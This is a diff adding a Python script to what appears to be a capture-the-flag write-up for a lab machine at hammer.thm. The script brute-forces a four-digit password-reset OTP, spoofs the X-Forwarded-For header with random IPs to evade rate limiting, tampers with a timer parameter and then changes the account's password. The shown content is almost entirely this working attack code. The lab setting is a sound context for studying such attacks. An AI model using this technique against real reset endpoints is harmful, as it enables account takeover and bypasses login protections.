@@ -125,6 +125,57 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - I wrote a python script to bruteforce the otp and it took multiple tries to get it because we have to bruteforce within `180 seconds`. The script also changes the password.
 
 ```python3
+#! /usr/bin/env python3
+from ten import *
+from dataclasses import dataclass
+import random
+import multiprocessing
+
+set_message_formatter("Oldschool")
+@entry
+@arg("h","host")
+@dataclass
+class Exploit:
+      host: str
+      @staticmethod
+      def change_password(session: object,headers: dict) -> str:
+          password = "nippedbud"
+          msg_info(f"Changing password to {password}")
+          data = {"new_password":password,"confirm_password":password}
+          response =  session.post("/reset_password.php",data=data,headers=headers)
+          msg_info(response.text)
+          msg_info(f"New Password: {password}")
+      def run(self):
+          session = ScopedSession(self.host)
+          endpoint = "/reset_password.php"
+          #Entering email
+          data = {"email":"tester@hammer.thm"}
+          response = session.post(endpoint,data=data)
+          headers = response.headers
+          cookie = headers["Set-Cookie"]
+          msg_info(f"Email: {data['email']}:{cookie}")
+          msg_info("Brute_forcing 4-key OTP")
+          digit = 60
+          for i in range(999,10000):
+              #s will be set to 1000 to prevent time from elapsing
+              data = {"recovery_code":i,"s":digit}
+              ip = f"127.0.{random.randint(0,255)}.{random.randint(0,255)}"
+              headers = {"X-Forwarded-For":ip,"X-Forwarded-For":ip,"cookie":cookie}
+              msg_info(f"Trying otp-code-{i}")
+              resp2 = session.post(endpoint,data=data,headers=headers,allow_redirects=True,timeout=400000)
+              if resp2.contains("Invalid or expired recovery code!"):
+                 msg_failure("Incorrect OTP")
+              elif resp2.contains("New Password"):
+                   Exploit.change_password(session,headers)
+                   leave("Done")
+              else:
+                leave("Elapsed time")
+
+if __name__ == "__main__":
+   process = multiprocessing.Process(target=Exploit)
+   process.start()
+   process.join()
+```
 
 
 
